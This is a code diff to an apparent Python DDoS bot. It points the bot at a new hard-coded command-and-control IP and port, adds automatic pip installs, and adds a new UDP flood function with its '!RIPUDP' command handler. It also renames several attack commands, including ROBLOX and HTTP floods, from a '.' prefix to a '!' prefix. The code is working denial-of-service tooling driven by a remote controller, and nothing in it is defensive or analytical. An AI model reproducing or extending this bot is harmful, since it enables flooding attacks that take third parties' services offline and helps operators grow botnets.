@@ -1,7 +1,20 @@
+import subprocess
+
+def installer_modules():
+    # Installation de cloudscraper
+    subprocess.call(['pip', 'install', 'cloudscraper'])
+
+    # Installation de requests
+    subprocess.call(['pip', 'install', 'requests'])
+
+
+if __name__ == "__main__":
+    # Appel de la fonction d'installation des modules
+    installer_modules()
 import socket, threading, time, random, cloudscraper, requests
 
-C2_ADDRESS  = "77.83.242.97"
-C2_PORT     = 6667
+C2_ADDRESS  = "77.83.242.23"
+C2_PORT     = 6669
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
@@ -1065,6 +1078,15 @@ def attack_tcp(ip, port, secs, size):
         except:
             pass
 
+def attack_ripudp(ip, port, secs, lens):
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            while time.time() < secs:
+                s.sendto(random._urandom(lens), (ip, port))
+        except:
+            pass
+
 def attack_tup(ip, port, secs, size):
     while time.time() < secs:
         udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -1160,6 +1182,15 @@ def main():
 
                     for _ in range(threads):
                         threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
+                elif command == '!RIPUDP':
+                    ip = data[1]
+                    port = int(data[2])
+                    secs = time.time() + int(data[3])
+                    lens = int(data[4])  # Assume that length is directly provided without 'len='
+                    threads = int(data[5])
+                    
+                    for _ in range(threads):
+                        threading.Thread(target=attack_ripudp, args=(ip, port, time.time() + secs, lens)).start()
                 elif command == '!HEX':
                     ip = args[1]
                     port = int(args[2])
@@ -1168,7 +1199,7 @@ def main():
 
                     for _ in range(threads):
                         threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
-                elif command == '.ROBLOX':
+                elif command == '!ROBLOX':
 
                         ip = args[1]
                         port = int(args[2])
@@ -1188,14 +1219,14 @@ def main():
                         threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                         threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                         threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
-                elif command == ".HTTP_REQ":
+                elif command == "!HTTP_REQ":
                     url = args[1]
                     port = args[2]
                     secs = time.time() + int(args[3])
                     threads = int(args[4])
                     for _ in range(threads):
                         threading.Thread(target=REQ_attack, args=(url,secs,port), daemon=True).start()
-                elif command == ".HTTP_CFB":
+                elif command == "!HTTP_CFB":
                     url = args[1]
                     port = args[2]
                     secs = time.time() + int(args[3])
